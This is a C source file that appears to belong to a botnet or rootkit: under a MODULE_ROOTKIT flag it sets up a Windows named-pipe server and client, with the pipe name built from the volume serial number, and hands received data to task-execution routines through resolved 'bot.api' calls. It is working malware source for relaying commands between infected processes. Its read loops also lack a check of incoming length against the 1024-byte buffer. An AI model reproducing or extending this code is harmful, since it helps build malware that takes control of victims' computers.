#include "ipc.h"

#ifdef MODULE_ROOTKIT
#include "mem.h"
#include "utils.h"
#include "string.h"

#include "pipes.h"
#include "ipc_tasks.h"

extern bot_t bot;

static LPWSTR _GeneratePipeName()
{
	unsigned int iLength;

	wchar_t wzPipeName[256];
	memzero(&wzPipeName, sizeof(wzPipeName));
	if ((iLength = bot.api.pwsprintfW(wzPipeName, L"\\\\.\\pipe\\%x_server", GetSerialNumber())) > 0)
	{
		return StrCopyW(wzPipeName, iLength + 1);
	}

	return NULL;
}

static void _HandleServerData(HANDLE hPipe, LPSTR pszData, DWORD dwLength)
{
	ExecuteIPCServerTask(pszData);
}

static DWORD Pipe_Connection(HANDLE hPipe)
{
	DWORD dwDataAvailable, dwDataRead;
	char szBuffer[1024];

	AddPipeToList(hPipe);

	while (TRUE)
	{
		dwDataAvailable = 0;

		if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwDataAvailable, NULL) && dwDataAvailable > 0)
		{
			memzero(&szBuffer, sizeof(szBuffer));

			if (bot.api.pReadFile(hPipe, szBuffer, dwDataAvailable, &dwDataRead, NULL) && dwDataRead > 0)
			{
				_HandleServerData(hPipe, StrCopyA(szBuffer, dwDataRead), dwDataRead);
			}
			else break;
		}

		bot.api.pSleep(500);
	}

	RemovePipeFromList(hPipe);

	FlushFileBuffers(hPipe);
	DisconnectNamedPipe(hPipe);
	bot.api.pCloseHandle(hPipe);

	return 0;
}

static DWORD IPC_Server(LPVOID lpArguments)
{
	LPWSTR pwzPipeName;
	HANDLE hPipe, hThread;

	if ((pwzPipeName = _GeneratePipeName()) == NULL)
		return 0;

	do
	{
		if ((hPipe = CreateNamedPipeW(
			pwzPipeName,
			PIPE_ACCESS_DUPLEX,
			PIPE_TYPE_MESSAGE |
			PIPE_READMODE_MESSAGE |
			PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			1024,
			1024,
			0,
			NULL)) == INVALID_HANDLE_VALUE)
		{
			bot.api.pSleep(1000);
			continue;
		}

		if (ConnectNamedPipe(hPipe, NULL))
		{
			if ((hThread = bot.api.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Pipe_Connection, (LPVOID)hPipe, 0, NULL)) != 0)
			{
				bot.api.pCloseHandle(hThread);
			}
		}

	} while (TRUE);

	memfree(pwzPipeName);


	return 0;
}

BOOL WINAPI RunIPCServer(void)
{
	HANDLE hThread;

	if ((hThread = bot.api.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IPC_Server, NULL, 0, NULL)) != 0)
	{
		bot.api.pCloseHandle(hThread);
		return TRUE;
	}

	return FALSE;
}

static void _HandleClientData(HANDLE hPipe, const LPSTR pszData, DWORD dwLength)
{
	ExecuteIPCClientTask(pszData);
}

static DWORD IPC_Client(LPVOID lpArguments)
{
	HANDLE hPipe;
	LPWSTR pwzPipeName;
	DWORD dwDataAvailable, dwDataRead;
	char szBuffer[1024];

	if ((pwzPipeName = _GeneratePipeName()) == NULL)
		return 0;

	while (TRUE)
	{
		if ((hPipe = bot.api.pCreateFileW(
			pwzPipeName,
			GENERIC_READ |
			GENERIC_WRITE,
			0,
			NULL,
			OPEN_EXISTING,
			0,
			NULL)) != INVALID_HANDLE_VALUE)
		{
			AddPipeToList(hPipe);

			while (TRUE)
			{
				dwDataAvailable = 0;

				if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwDataAvailable, NULL) && dwDataAvailable > 0)
				{
					memzero(&szBuffer, sizeof(szBuffer));

					if (bot.api.pReadFile(hPipe, szBuffer, dwDataAvailable, &dwDataRead, NULL) && dwDataRead > 0)
					{
						_HandleClientData(hPipe, StrCopyA(szBuffer, dwDataRead), dwDataRead);
					}
					else break;
				}
			}
			RemovePipeFromList(hPipe);
		}

		bot.api.pSleep(1000);
	}
	return 0;
}

BOOL WINAPI RunIPCClient(void)
{
	HANDLE hThread;

	if ((hThread = bot.api.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IPC_Client, NULL, 0, NULL)) != 0)
	{
		bot.api.pCloseHandle(hThread);
		return TRUE;
	}

	return FALSE;
}
#endif